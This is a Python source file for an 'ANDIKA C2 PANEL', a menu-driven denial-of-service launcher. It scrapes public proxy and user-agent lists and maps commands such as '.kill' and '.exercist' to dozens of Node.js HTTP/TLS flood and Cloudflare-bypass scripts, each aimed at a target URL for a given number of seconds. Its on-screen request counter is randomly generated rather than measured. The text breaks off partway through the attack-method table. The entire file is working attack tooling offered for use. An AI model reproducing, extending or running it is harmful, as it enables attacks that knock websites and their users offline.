#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import threading
import time
import json
import requests
from urllib.parse import urlparse
import colorama
from datetime import datetime
import random
import signal
import re

colorama.init(autoreset=True)

AUTHOR = "ANDIKA"
VERSION = "4.0"
TOOL_NAME = "ANDIKA C2 PANEL"

active_attacks = {}
attack_lock = threading.Lock()
proxy_list = []
ua_list = []
proxies_loaded = False
proxy_loading_in_progress = False

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    DARK = '\033[90m'
    PURPLE = '\033[95m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.CYAN}║{Colors.RESET}                                                                      {Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.MAGENTA}        █████╗ ███╗   ██╗██████╗ ██╗██╗  ██╗ █████╗{Colors.CYAN}             ║{Colors.RESET}
{Colors.CYAN}║{Colors.MAGENTA}       ██╔══██╗████╗  ██║██╔══██╗██║██║ ██╔╝██╔══██╗{Colors.CYAN}            ║{Colors.RESET}
{Colors.CYAN}║{Colors.MAGENTA}       ███████║██╔██╗ ██║██║  ██║██║█████╔╝ ███████║{Colors.CYAN}            ║{Colors.RESET}
{Colors.CYAN}║{Colors.MAGENTA}       ██╔══██║██║╚██╗██║██║  ██║██║██╔═██╗ ██╔══██║{Colors.CYAN}            ║{Colors.RESET}
{Colors.CYAN}║{Colors.MAGENTA}       ██║  ██║██║ ╚████║██████╔╝██║██║  ██╗██║  ██║{Colors.CYAN}            ║{Colors.RESET}
{Colors.CYAN}║{Colors.MAGENTA}       ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝{Colors.CYAN}             ║{Colors.RESET}
{Colors.CYAN}║                                                                      ║
{Colors.CYAN}║{Colors.YELLOW}                 A N D I K A   P H O E N I X{Colors.CYAN}                  ║{Colors.RESET}
{Colors.CYAN}║{Colors.GREEN}                    ● SYSTEM ONLINE{Colors.CYAN}                          ║{Colors.RESET}
{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.CYAN}║{Colors.WHITE}  AUTHOR  : {Colors.GREEN}{AUTHOR:<54}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.WHITE}  VERSION : {Colors.GREEN}{VERSION:<54}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║{Colors.WHITE}  STATUS  : {Colors.GREEN}{'ONLINE':<54}{Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.CYAN}║{Colors.YELLOW}                        COMMAND CENTER{Colors.CYAN}                         ║{Colors.RESET}
{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.CYAN}║  {Colors.GREEN}.help{Colors.WHITE}       Help Menu          {Colors.GREEN}.methods{Colors.WHITE}    Methods        {Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║  {Colors.GREEN}.status{Colors.WHITE}     Status             {Colors.GREEN}.info{Colors.WHITE}       System Info    {Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║  {Colors.GREEN}.clear{Colors.WHITE}      Refresh Screen     {Colors.GREEN}.stop{Colors.WHITE}       Stop All       {Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}║  {Colors.GREEN}.list{Colors.WHITE}       List Methods      {Colors.GREEN}.exit{Colors.WHITE}       Exit Panel      {Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.CYAN}║{Colors.YELLOW}  [!] Ketik .help untuk bantuan | .methods untuk daftar lengkap      {Colors.CYAN}║{Colors.RESET}
{Colors.CYAN}╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.DARK}                         // ANDIKA //{Colors.RESET}
"""
    print(banner)

def show_all_methods():
    clear_screen()
    methods_info = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗
║              {Colors.BOLD}ALL AVAILABLE METHODS{Colors.CYAN}                            ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}METHOD      {Colors.GREEN}│  {Colors.WHITE}SCRIPTS  {Colors.GREEN}│  {Colors.WHITE}DIRECTORY            {Colors.GREEN}│  {Colors.WHITE}STATUS      │
├─────────────────────────────────────────────────────────────────┤{Colors.RESET}

{Colors.YELLOW}  .kill       {Colors.WHITE}│  {Colors.GREEN}18       {Colors.WHITE}│  {Colors.CYAN}methods + phoenix    {Colors.WHITE}│  {Colors.GREEN}✅ Active   │
{Colors.YELLOW}  .phoenix    {Colors.WHITE}│  {Colors.GREEN}15       {Colors.WHITE}│  {Colors.CYAN}lib/cache + methods  {Colors.WHITE}│  {Colors.GREEN}✅ Active   │
{Colors.YELLOW}  .exorcist   {Colors.WHITE}│  {Colors.GREEN}4        {Colors.WHITE}│  {Colors.CYAN}methods              {Colors.WHITE}│  {Colors.GREEN}✅ Active   │
{Colors.YELLOW}  .blaze      {Colors.WHITE}│  {Colors.GREEN}10       {Colors.WHITE}│  {Colors.CYAN}methods              {Colors.WHITE}│  {Colors.GREEN}✅ Active   │
{Colors.YELLOW}  .ultimate   {Colors.WHITE}│  {Colors.GREEN}15       {Colors.WHITE}│  {Colors.CYAN}methods              {Colors.WHITE}│  {Colors.GREEN}✅ Active   │
{Colors.YELLOW}  .exercist   {Colors.WHITE}│  {Colors.GREEN}22       {Colors.WHITE}│  {Colors.CYAN}methods              {Colors.WHITE}│  {Colors.GREEN}✅ Active   │

{Colors.RED}└─────────────────────────────────────────────────────────────────┘{Colors.RESET}

{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗
║              {Colors.BOLD}DETAILED SCRIPT LIST{Colors.CYAN}                             ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}.kill - 18 Scripts{Colors.GREEN}                                           │
├─────────────────────────────────────────────────────────────────┤{Colors.RESET}
{Colors.WHITE}  ├─ methods/H2CA.js
  ├─ methods/HDRH2.js
  ├─ methods/H2F3.js
  ├─ methods/BLAST.js
  ├─ phoenix/tlsv2.js
  ├─ phoenix/bypassv2.js
  ├─ phoenix/blast.js
  ├─ phoenix/floodv2.js
  ├─ phoenix/sky.js
  ├─ phoenix/raw.js
  ├─ phoenix/uam.js
  ├─ phoenix/https.js
  ├─ phoenix/storm.js
  ├─ phoenix/HTTP-CUSTOM.js
  ├─ phoenix/flood.js
  ├─ phoenix/darbost.js
  ├─ phoenix/bypass.js
  └─ phoenix/boost.js{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}.phoenix - 15 Scripts{Colors.GREEN}                                        │
├─────────────────────────────────────────────────────────────────┤{Colors.RESET}
{Colors.WHITE}  ├─ lib/cache/HTTP-X.js
  ├─ lib/cache/StarsXPidoras.js
  ├─ lib/cache/StarsXRapid-Reset.js
  ├─ lib/cache/StarsXRaw.js
  ├─ lib/cache/StarsXMix.js
  ├─ lib/cache/StarsXNinja.js
  ├─ lib/cache/StarsXTls.js
  ├─ lib/cache/StarsXStrike.js
  ├─ lib/cache/StarsXBypass.js
  ├─ lib/cache/StarsXKill.js
  ├─ methods/HTTP.js
  ├─ methods/HTTPS.js
  ├─ methods/HTTPX.js
  ├─ methods/BLAST.js
  └─ methods/MIXMAX.js{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}.exorcist - 4 Scripts{Colors.GREEN}                                        │
├─────────────────────────────────────────────────────────────────┤{Colors.RESET}
{Colors.WHITE}  ├─ methods/TLS.js
  ├─ methods/R2.js
  ├─ methods/RAND.js
  └─ methods/BLAST.js{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}.blaze - 10 Scripts{Colors.GREEN}                                          │
├─────────────────────────────────────────────────────────────────┤{Colors.RESET}
{Colors.WHITE}  ├─ methods/H2CA.js
  ├─ methods/HDRH2.js
  ├─ methods/H2F3.js
  ├─ methods/HTTP.js
  ├─ methods/RAND.js
  ├─ methods/TLS.js
  ├─ methods/R2.js
  ├─ methods/HTTPS.js
  ├─ methods/HTTPX.js
  └─ methods/BLAST.js{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}.ultimate - 15 Scripts{Colors.GREEN}                                       │
├─────────────────────────────────────────────────────────────────┤{Colors.RESET}
{Colors.WHITE}  ├─ methods/H2CA.js
  ├─ methods/pidoras.js
  ├─ methods/floods.js
  ├─ methods/browser.js
  ├─ methods/HDRH2.js
  ├─ methods/H2F3.js
  ├─ methods/HTTP.js
  ├─ methods/Cloudflare.js
  ├─ methods/RAND.js
  ├─ methods/TLS.js
  ├─ methods/R2.js
  ├─ methods/HTTPS.js
  ├─ methods/HTTP-RAW.js
  ├─ methods/HTTPX.js
  └─ methods/BLAST.js{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│  {Colors.WHITE}.exercist - 22 Scripts{Colors.GREEN}                                       │
├─────────────────────────────────────────────────────────────────┤{Colors.RESET}
{Colors.WHITE}  ├─ methods/novaria.js
  ├─ methods/pidoras.js
  ├─ methods/floods.js
  ├─ methods/browser.js
  ├─ methods/CBROWSER.js
  ├─ methods/H2CA.js
  ├─ methods/H2F3.js
  ├─ methods/H2GEC.js
  ├─ methods/HTTP.js
  ├─ methods/FLUTRA.js
  ├─ methods/Cloudflare.js
  ├─ methods/CFbypass.js
  ├─ methods/bypassv1
  ├─ methods/hyper.js
  ├─ methods/RAND.js
  ├─ methods/TLS.js
  ├─ methods/TLS-LOST.js
  ├─ methods/TLS-BYPASS.js
  ├─ methods/tls.vip
  ├─ methods/R2.js
  ├─ methods/HTTPS.js
  ├─ methods/HTTPX.js
  └─ methods/BLAST.js{Colors.RESET}

{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗
║              {Colors.BOLD}TOTAL SCRIPTS{Colors.CYAN}                                    ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}  Total Unique Scripts: {Colors.WHITE}84+
{Colors.GREEN}  Total Methods:       {Colors.WHITE}6
{Colors.GREEN}  Directories:         {Colors.WHITE}3 (methods, phoenix, lib/cache){Colors.RESET}

{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════════╗
║  {Colors.WHITE}USAGE: .<method> <URL> <TIME>{Colors.YELLOW}                                    ║
║  {Colors.WHITE}Example: .kill http://example.com 60{Colors.YELLOW}                             ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(methods_info)
    input(f"\n{Colors.CYAN}[!] Press Enter to continue...{Colors.RESET}")

def show_help():
    clear_screen()
    help_text = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗
║                    {Colors.BOLD}andika HELP MENU{Colors.CYAN}                      ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│                  ATTACK METHODS & USAGE                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  {Colors.YELLOW}.kill        {Colors.WHITE}.kill <URL> <TIME>    (18 scripts)              │
│  {Colors.YELLOW}.phoenix    {Colors.WHITE}.phoenix <URL> <TIME>  (15 scripts)              │
│  {Colors.YELLOW}.exorcist   {Colors.WHITE}.exorcist <URL> <TIME>(4 scripts)               │
│  {Colors.YELLOW}.blaze      {Colors.WHITE}.blaze <URL> <TIME>   (10 scripts)              │
│  {Colors.YELLOW}.ultimate   {Colors.WHITE}.ultimate <URL> <TIME>(15 scripts)              │
│  {Colors.YELLOW}.exercist   {Colors.WHITE}.exercist <URL> <TIME>(22 scripts)              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│                  OTHER COMMANDS                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  {Colors.YELLOW}.proxy       {Colors.WHITE}Download/Update proxy list (manual)            │
│  {Colors.YELLOW}.status      {Colors.WHITE}Show active attacks                            │
│  {Colors.YELLOW}.stop        {Colors.WHITE}Stop all running attacks                       │
│  {Colors.YELLOW}.info        {Colors.WHITE}Show system information                       │
│  {Colors.YELLOW}.methods     {Colors.WHITE}Show all available methods with details       │
│  {Colors.YELLOW}.list        {Colors.WHITE}Same as .methods                              │
│  {Colors.YELLOW}.ls          {Colors.WHITE}Same as .methods                              │
│  {Colors.YELLOW}.help        {Colors.WHITE}Show this help menu                           │
│  {Colors.YELLOW}.clear       {Colors.WHITE}Clear terminal screen                         │
│  {Colors.YELLOW}.exit        {Colors.WHITE}Exit panel                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘{Colors.RESET}

{Colors.GREEN}┌─────────────────────────────────────────────────────────────────┐
│                  EXAMPLES                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  {Colors.WHITE}.kill http://example.com 60                                 │
│  {Colors.WHITE}.phoenix https://target.com 120                            │
│  {Colors.WHITE}.exercist http://target.com 300                           │
│  {Colors.WHITE}.methods                                                  │
│  {Colors.WHITE}.proxy      # Manual proxy update                         │
│  {Colors.WHITE}.status                                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘{Colors.RESET}

{Colors.MAGENTA}Author: {AUTHOR} | Version: {VERSION}{Colors.RESET}
"""
    print(help_text)
    input(f"\n{Colors.CYAN}[!] Press Enter to continue...{Colors.RESET}")

def show_info():
    proxy_status = f"{Colors.GREEN}Loaded ({len(proxy_list)} proxies)" if proxies_loaded else f"{Colors.YELLOW}Not loaded (use .proxy)"
    print(f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗
║                    SYSTEM INFORMATION                         ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}  Tool       : {Colors.WHITE}{TOOL_NAME}
{Colors.GREEN}  Author     : {Colors.WHITE}{AUTHOR}
{Colors.GREEN}  Version    : {Colors.WHITE}{VERSION}
{Colors.GREEN}  Python     : {Colors.WHITE}{sys.version.split()[0]}
{Colors.GREEN}  OS         : {Colors.WHITE}{os.name}
{Colors.GREEN}  Time       : {Colors.WHITE}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.GREEN}  CWD        : {Colors.WHITE}{os.getcwd()}
{Colors.GREEN}  Proxies    : {Colors.WHITE}{proxy_status}
{Colors.GREEN}  User-Agents: {Colors.WHITE}{len(ua_list)} loaded
{Colors.GREEN}  Active     : {Colors.WHITE}{len(active_attacks)} attacks running
{Colors.GREEN}  Methods    : {Colors.WHITE}6 available
{Colors.GREEN}  Scripts    : {Colors.WHITE}84+ total{Colors.RESET}
""")

def show_status():
    with attack_lock:
        if not active_attacks:
            print(f"{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════════╗")
            print(f"{Colors.YELLOW}║  {Colors.WHITE}No active attacks running{Colors.YELLOW}                              ║")
            print(f"{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}")
            return
        
        print(f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗
║                    ACTIVE ATTACKS                            ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
        
        for attack_id, info in active_attacks.items():
            elapsed = int(time.time() - info['start_time'])
            remaining = max(0, int(info['duration']) - elapsed)
            progress = min(100, int((elapsed / int(info['duration'])) * 100))
            bar_length = 40
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            print(f"""
{Colors.GREEN}┌─ Attack ID: {Colors.WHITE}{attack_id}
{Colors.GREEN}├─ Method   : {Colors.WHITE}{info['method'].upper()}
{Colors.GREEN}├─ Target   : {Colors.WHITE}{info['target']}
{Colors.GREEN}├─ Progress : {Colors.WHITE}[{bar}] {progress}%
{Colors.GREEN}├─ Time     : {Colors.WHITE}{elapsed}s / {info['duration']}s
{Colors.GREEN}├─ Status   : {Colors.GREEN}● RUNNING
{Colors.GREEN}└─ Requests : {Colors.WHITE}{info.get('requests', 0):,}{Colors.RESET}
""")

def stop_all_attacks():
    with attack_lock:
        if not active_attacks:
            print(f"{Colors.YELLOW}[!] No active attacks to stop{Colors.RESET}")
            return
        
        print(f"{Colors.RED}[!] Stopping all attacks...{Colors.RESET}")
        for attack_id in list(active_attacks.keys()):
            active_attacks[attack_id]['stop'] = True
        time.sleep(1)
        print(f"{Colors.GREEN}[+] All attacks stopped!{Colors.RESET}")

def load_proxies_from_file():
    global proxy_list, proxies_loaded
    try:
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                proxies = f.read().strip().split('\n')
                valid_proxies = [p.strip() for p in proxies if p.strip()]
                if valid_proxies:
                    proxy_list = valid_proxies
                    proxies_loaded = True
                    print(f"{Colors.GREEN}[+] Loaded {len(proxy_list)} proxies from proxy.txt{Colors.RESET}")
                    return True
    except Exception as e:
        print(f"{Colors.RED}[-] Error loading proxies: {e}{Colors.RESET}")
    return False

def scrape_proxy():
    global proxy_list, proxies_loaded, proxy_loading_in_progress
    
    if proxy_loading_in_progress:
        print(f"{Colors.YELLOW}[!] Proxy download already in progress...{Colors.RESET}")
        return
    
    proxy_loading_in_progress = True
    
    proxy_urls = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
        "https://multiproxy.org/txt_all/proxy.txt",
        "https://rootjazz.com/proxies/proxies.txt",
        "https://api.openproxylist.xyz/http.txt",
        "https://api.openproxylist.xyz/https.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
        "https://spys.me/proxy.txt"
    ]
    
    print(f"{Colors.YELLOW}[*] Fetching proxies from {len(proxy_urls)} sources...{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] This may take a few seconds...{Colors.RESET}\n")
    
    all_proxies = []
    success_count = 0
    
    for i, url in enumerate(proxy_urls, 1):
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies = response.text.strip().split('\n')
                valid_proxies = [p.strip() for p in proxies if p.strip() and not p.startswith('#')]
                all_proxies.extend(valid_proxies)
                success_count += 1
                print(f"{Colors.GREEN}[+] [{i}/{len(proxy_urls)}] Got {len(valid_proxies)} proxies from {url.split('/')[2]}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] [{i}/{len(proxy_urls)}] Failed: {url.split('/')[2]}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] [{i}/{len(proxy_urls)}] Error: {url.split('/')[2]} - {str(e)[:30]}{Colors.RESET}")
    
    unique_proxies = list(set(all_proxies))
    
    with open('proxy.txt', 'w') as f:
        f.write('\n'.join(unique_proxies))
    
    proxy_list = unique_proxies
    proxies_loaded = True
    proxy_loading_in_progress = False
    
    print(f"""
{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗
║  {Colors.WHITE}✅ Proxy update complete!{Colors.GREEN}                                   ║
║  {Colors.WHITE}Total proxies: {len(unique_proxies):,}{Colors.GREEN}                                    ║
║  {Colors.WHITE}Sources: {success_count}/{len(proxy_urls)} successful{Colors.GREEN}                              ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

def scrape_user_agent():
    global ua_list
    if ua_list:
        return
    
    try:
        response = requests.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt', timeout=10)
        if response.status_code == 200:
            ua_list = response.text.strip().split('\n')
            with open('ua.txt', 'w') as f:
                f.write('\n'.join(ua_list))
            print(f"{Colors.GREEN}[+] Loaded {len(ua_list)} user agents{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] Failed to fetch user agents{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error fetching user agents: {e}{Colors.RESET}")

def show_attack_animation(attack_id, method, target, duration):
    frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    start_time = time.time()
    end_time = start_time + int(duration)
    last_update = 0
    request_count = 0
    
    status_messages = {
        'kill': ['🔪 Kill attack', '💀 Executing Kill', '🔥 Kill flood', '☠️ Maximum power'],
        'phoenix': ['🐦 Phoenix rising', '🔥 Fire attack', '♻️ Rebirth flood', '⚡ Phoenix power'],
        'exorcist': ['👻 Exorcising demons', '💫 Spiritual attack', '⚡ Holy flood', '✨ Divine power'],
        'blaze': ['🔥 Blazing attack', '💥 Firestorm', '🌋 Volcanic flood', '🔥 Hellfire'],
        'ultimate': ['💀 Ultimate power', '☠️ Maximum attack', '⚡ God mode', '🌩️ Thunder strike'],
        'exercist': ['👹 Exercist attack', '💫 Multi-vector', '🌀 Combined flood', '⚡ Total destruction']
    }
    
    statuses = status_messages.get(method, ['🚀 Attacking', '💥 Flooding', '⚡ Power'])
    
    print(f"""
{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗
║  {Colors.WHITE}🔥 PHOENIX ATTACK STARTED{Colors.GREEN}                                       ║
╠═══════════════════════════════════════════════════════════════════╣
║  {Colors.WHITE}ID       : {Colors.YELLOW}{attack_id}{Colors.GREEN}                                      ║
║  {Colors.WHITE}Method   : {Colors.YELLOW}{method.upper()}{Colors.GREEN}                                      ║
║  {Colors.WHITE}Target   : {Colors.YELLOW}{target}{Colors.GREEN}                                        ║
║  {Colors.WHITE}Duration : {Colors.YELLOW}{duration}s{Colors.GREEN}                                        ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    while time.time() < end_time:
        elapsed = int(time.time() - start_time)
        remaining = max(0, int(end_time - time.time()))
        progress = min(100, int((elapsed / int(duration)) * 100))
        
        if time.time() - last_update > 1:
            request_count += random.randint(500, 2000)
            last_update = time.time()
        
        bar_length = 40
        filled = int(bar_length * progress / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        frame = frames[elapsed % len(frames)]
        status = random.choice(statuses)
        
        sys.stdout.write(f'\r{Colors.CYAN}{frame} {Colors.YELLOW}[{bar}] {Colors.GREEN}{progress}% {Colors.WHITE}| {Colors.CYAN}⏱️ {elapsed}s/{duration}s {Colors.WHITE}| {Colors.MAGENTA}📊 {request_count:,} req {Colors.WHITE}| {Colors.RED}{status}{Colors.RESET}')
        sys.stdout.flush()
        
        with attack_lock:
            if attack_id in active_attacks and active_attacks[attack_id].get('stop', False):
                break
        
        time.sleep(0.1)
    
    sys.stdout.write('\r' + ' ' * 120 + '\r')
    
    if time.time() >= end_time:
        print(f"""
{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗
║  {Colors.WHITE}✅ PHOENIX ATTACK COMPLETED{Colors.GREEN}                                     ║
╠═══════════════════════════════════════════════════════════════════╣
║  {Colors.WHITE}ID       : {Colors.YELLOW}{attack_id}{Colors.GREEN}                                      ║
║  {Colors.WHITE}Requests : {Colors.YELLOW}{request_count:,}{Colors.GREEN}                                      ║
║  {Colors.WHITE}Duration : {Colors.YELLOW}{duration}s{Colors.GREEN}                                        ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    else:
        print(f"""
{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════════╗
║  {Colors.WHITE}⏹️ PHOENIX ATTACK STOPPED{Colors.YELLOW}                                      ║
╠═══════════════════════════════════════════════════════════════════╣
║  {Colors.WHITE}ID       : {Colors.YELLOW}{attack_id}{Colors.YELLOW}                                      ║
║  {Colors.WHITE}Requests : {Colors.YELLOW}{request_count:,}{Colors.YELLOW}                                      ║
║  {Colors.WHITE}Duration : {Colors.YELLOW}{elapsed}s/{duration}s{Colors.YELLOW}                                    ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    with attack_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]

def execute_attack(target, duration, method):
    global proxies_loaded
    
    if not proxies_loaded:
        print(f"{Colors.YELLOW}[!] Proxies not loaded in memory. Trying to load from proxy.txt...{Colors.RESET}")
        if load_proxies_from_file():
            print(f"{Colors.GREEN}[+] Proxies loaded successfully!{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] No proxy file found!{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Please download proxies first using .proxy command{Colors.RESET}")
            return False
    
    parsed = urlparse(target if '://' in target else f'http://{target}')
    hostname = parsed.hostname or target
    
    attack_id = f"{method.upper()}-{datetime.now().strftime('%H%M%S')}-{random.randint(100,999)}"
    
    with attack_lock:
        active_attacks[attack_id] = {
            'target': target,
            'duration': duration,
            'method': method,
            'start_time': time.time(),
            'stop': False,
            'requests': 0
        }
    
    methods_dir = "./methods/"
    phoenix_dir = "./phoenix/"
    lib_dir = "./lib/cache/"
    
    method_map = {
        'kill': [
            f'{methods_dir}H2CA.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HDRH2.js', [target, duration, '10', '100', 'true'],
            f'{methods_dir}H2F3.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}BLAST.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}tlsv2.js', [target, duration, '8', '3'],
            f'{phoenix_dir}bypassv2.js', ['uam', duration, '10', 'proxy.txt', '100', target],
            f'{phoenix_dir}blast.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}floodv2.js', [target, duration, '8', '3'],
            f'{phoenix_dir}sky.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}raw.js', [target, duration],
            f'{phoenix_dir}uam.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}https.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}storm.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}HTTP-CUSTOM.js', ['HEAD', target, duration, '10', '7', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1'],
            f'{phoenix_dir}flood.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}darbost.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{phoenix_dir}bypass.js', [target, duration, '42', '10', 'proxy.txt'],
            f'{phoenix_dir}boost.js', [target, duration, '100', '10', 'proxy.txt']
        ],
        'phoenix': [
            f'{lib_dir}HTTP-X.js', [target, duration, '80', '10', 'proxy.txt'],
            f'{lib_dir}StarsXPidoras.js', [target, duration, '80', '10', 'proxy.txt'],
            f'{lib_dir}StarsXRapid-Reset.js', ['PermenMD', duration, '10', 'proxy.txt', '80', target],
            f'{lib_dir}StarsXRaw.js', [target, duration],
            f'{lib_dir}StarsXMix.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{lib_dir}StarsXNinja.js', [target, duration],
            f'{lib_dir}StarsXTls.js', [target, duration, '100', '10'],
            f'{lib_dir}StarsXStrike.js', ['GET', target, duration, '10', '90', 'proxy.txt', '--full'],
            f'{lib_dir}StarsXBypass.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{lib_dir}StarsXKill.js', [target, duration, '100', '10'],
            f'{methods_dir}HTTP.js', [target, duration],
            f'{methods_dir}HTTPS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTPX.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}BLAST.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}MIXMAX.js', [target, duration, '100', '10', 'proxy.txt']
        ],
        'exorcist': [
            f'{methods_dir}TLS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}R2.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}RAND.js', [target, duration],
            f'{methods_dir}BLAST.js', [target, duration, '100', '10', 'proxy.txt']
        ],
        'blaze': [
            f'{methods_dir}H2CA.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HDRH2.js', [target, duration, '10', '100', 'true'],
            f'{methods_dir}H2F3.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTP.js', [target, duration],
            f'{methods_dir}RAND.js', [target, duration],
            f'{methods_dir}TLS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}R2.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTPS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTPX.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}BLAST.js', [target, duration, '100', '10', 'proxy.txt']
        ],
        'ultimate': [
            f'{methods_dir}H2CA.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}pidoras.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}floods.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}browser.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HDRH2.js', [target, duration, '10', '100', 'true'],
